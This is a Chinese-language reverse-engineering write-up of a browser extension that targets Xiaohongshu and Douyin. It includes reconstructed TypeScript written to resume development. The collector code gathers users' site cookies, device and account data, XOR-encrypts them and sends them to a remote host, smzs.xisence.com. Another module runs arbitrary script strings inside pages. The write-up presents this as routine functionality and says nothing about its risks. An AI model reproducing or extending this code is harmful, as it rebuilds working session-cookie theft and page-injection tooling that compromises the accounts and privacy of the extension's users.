# 业务流程推断与“重建版本”草案

> 说明：以下内容基于已编译的扩展产物进行逆向推断，
> 仅用于帮助恢复可读性与理解业务流程。命名、结构与边界条件可能与原始源码不同。

## 高层功能概览

从现有构建产物中可以推断该项目是一个浏览器扩展（Manifest V3），
核心功能包括：

1. **后台服务（service worker）**：负责闹钟任务、信息收集、与各页面脚本的通信。
2. **Side Panel 与 Options UI**：提供面板与设置页。
3. **内容脚本（content scripts）**：注入到指定站点（小红书、抖音等），执行页面内逻辑与数据采集。
4. **网络请求与上报**：将采集的数据通过加密上传到远程接口。

## 关键业务流程（推断）

### 1) 初始化与运行模式

- 扩展启动时，会初始化 Side Panel 的打开行为。
- 为 storage session 设定访问级别。
- 注册 `onInstalled` 与 `onAlarm` 监听，确保闹钟任务与首次安装逻辑可以运行。

### 2) 定时任务（闹钟）

- 存储在 `local:taskAlarms` 的任务列表用于控制自动化任务。
- 当 `onAlarm` 触发时：
  - 根据闹钟名称找到对应任务
  - 获取平台配置（例如小红书、抖音等）
  - 创建新的 tab 打开目标站点
  - 轮询等待页面准备后执行任务

### 3) 采集上报流程

- 收到 `collect` 请求时：
  - 解析 URL 获取平台代码
  - 判断是否需要触发“特定平台”逻辑（比如小红书的特殊账号检测）
  - 控制采集频率（1小时内只上传一次）
  - 收集 cookies、设备信息、版本号、账号信息
  - 生成随机 key，对 payload 做 XOR 加密
  - 向远程接口 `https://smzs.xisence.com/api/collect` 上报

### 4) 页面脚本调用

- 后台提供通用 `executeScript` 通道：
  - 接收一段 JS function 的字符串
  - 解析参数列表与函数体
  - 使用 `chrome.scripting.executeScript` 在页面中执行

### 5) 文件上传

- `upload` 接口会先下载目标文件，再以 `FormData` 方式上传。
- 限制文件大小：> 20MB 拒绝上传。

---

## 重建版本（可读性更高的伪代码）

> 目标：以更清晰的模块与命名重建代码结构，
> 便于恢复开发与排查逻辑。

### `background/serviceWorker.ts`

```ts
// 伪代码，示意结构

import { AlarmStore, scheduleIfMissing } from "./services/alarms";
import { collectOncePerHour } from "./services/collector";
import { openSidePanel } from "./services/sidepanel";
import { executePageFunction } from "./services/executeScript";
import { uploadFile } from "./services/upload";

// 初始化
setupSidePanelBehavior();
setupStorageSessionAccess();

chrome.runtime.onInstalled.addListener(() => {
  initializeDefaultData();
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
  const task = await AlarmStore.findById(alarm.name);
  if (!task?.enabled) return chrome.alarms.clear(alarm.name);

  const platform = resolvePlatform(task.platform);
  if (!platform) return chrome.alarms.clear(alarm.name);

  const tab = await chrome.tabs.create({ url: platform.origin });

  // 轮询等待页面 readiness，再触发任务
  for (let i = 0; i < 10; i++) {
    const ready = await waitForPageReady(tab.id, task);
    if (ready) break;
    await sleep(2000);
  }
});

// RPC-like handlers
handle("openSidepanel", openSidePanel);
handle("executeScript", executePageFunction);
handle("collect", collectOncePerHour);
handle("upload", uploadFile);
```

### `services/collector.ts`

```ts
import { getPlatformCode } from "./platforms";
import { getCookiesForUrl } from "./chromeAdapter";
import { xorEncrypt, randomKeyHex } from "./crypto";

const lastCollectKey = "session:lastCollectTime";

export async function collectOncePerHour({ sender, accountInfo }) {
  if (!sender.url) return;

  const platform = getPlatformCode(sender.url);
  if (!platform) return;

  if (await recentlyCollected(platform, lastCollectKey, 1 /* hour */)) return;
  await markCollected(platform, lastCollectKey);

  const cookies = await getCookiesForUrl(sender.url);
  const deviceId = await getDeviceId();
  const version = chrome.runtime.getManifest().version;
  const platformInfo = await chrome.runtime.getPlatformInfo();

  const payload = {
    account: accountInfo,
    deviceId,
    cookies,
    version,
    platform,
    cpuArch: platformInfo.arch,
    osName: platformInfo.os,
  };

  const key = randomKeyHex();
  const encrypted = xorEncrypt(JSON.stringify(payload), key);

  await fetch(`https://smzs.xisence.com/api/collect?key=${key}&timestamp=${Date.now()}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/octet-stream",
      "x-version": version,
      "x-platform": platform,
      "x-device-id": deviceId,
    },
    body: encrypted,
  });
}
```

### `services/executeScript.ts`

```ts
export async function executePageFunction({ data, sender }) {
  if (!sender.tab?.id) return;

  const funcText = data.script.trim();
  const isAsync = funcText.startsWith("async");
  const normalized = isAsync ? funcText.slice(5).trim() : funcText;

  const args = data.args || [];
  const [params, body] = parseFunctionSignature(normalized);

  const result = await chrome.scripting.executeScript({
    target: { tabId: sender.tab.id },
    world: "MAIN",
    func: (argNames, argValues) => {
      const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
      return new AsyncFunction(...argNames)(...argValues);
    },
    args: [[...params, body], args],
  });

  return result?.[0]?.result;
}
```

### `services/upload.ts`

```ts
export async function uploadFile({ url, fileUrl, fileName, formData, ...init }) {
  const fileResponse = await fetch(fileUrl);
  if (!fileResponse.ok) throw new Error(`文件下载失败: ${fileResponse.status}`);

  const contentLength = Number(fileResponse.headers.get("content-length"));
  if (contentLength > 20 * 1024 * 1024) {
    console.warn(`「${fileName}」超过 20MB，拒绝上传`);
    throw new Error("文件大小超过20MB，无法上传");
  }

  const blob = await fileResponse.blob();
  const form = new FormData();
  if (formData) {
    Object.entries(formData).forEach(([k, v]) => form.append(k, v));
  }

  form.append("file", blob, fileName);
  form.append("size", String(blob.size));

  const response = await fetch(url, { ...init, body: form });
  const contentType = response.headers.get("content-type");
  return contentType?.includes("application/json") ? response.json() : response.text();
}
```

---

## 下一步（如需继续还原）

1. 提供或确认原始功能模块名称（如“采集任务”“账号管理”等）。
2. 根据需求选择优先还原的模块（后台逻辑/内容脚本/UI）。
3. 若能找到构建配置（如 vite/rollup/webpack）或 CI 日志，可提高还原精度。
